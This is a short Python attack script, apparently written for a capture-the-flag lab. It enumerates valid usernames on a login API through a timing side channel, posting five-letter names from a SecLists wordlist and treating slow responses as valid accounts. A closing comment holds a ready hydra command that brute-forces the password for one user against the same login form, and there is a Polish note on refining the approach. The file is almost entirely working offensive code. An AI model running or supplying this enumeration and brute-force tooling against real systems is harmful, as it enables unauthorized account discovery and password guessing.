import requests
import time

username_path = "/usr/share/wordlists/SecLists/Usernames/Names/names.txt"
usernames = []

with open(username_path, "r") as f:
    for user in f.read().splitlines():
        if len(user) == 5:
            usernames.append(user)

url = "http://10.10.68.95/api/user/login"

payload_template = {
    "username": "",  # Placeholder for username
    "password": "1",
}


def update_user(user):
    payload = payload_template.copy()
    payload["username"] = user
    return payload


def counting_time(payload):
    start_time = time.time()
    response = requests.post(url, payload)
    end_time = time.time()

    if response.status_code == 200:
        return end_time - start_time
    return None


def attack_time():
    for user in usernames:
        payload = update_user(user)
        elapsed_time = counting_time(payload)

        if elapsed_time is None:
            print("invalid")
            continue
        elif elapsed_time < 1:
            print("invalid")
            continue
        else:
            print(f"Valid user: {user}")
            break


def main():
    attack_time()


if __name__ == "__main__":
    main()


# hydra -l james -P wordlist.txt 10.10.225.211 http-post-form "/api/user/login:username=james&password=^PASS^:Invalid Username Or Password"

#! można to zrobić tak, ze czas uzytwkonika przechowwyac w słowniku a poźniej to sprawdzic
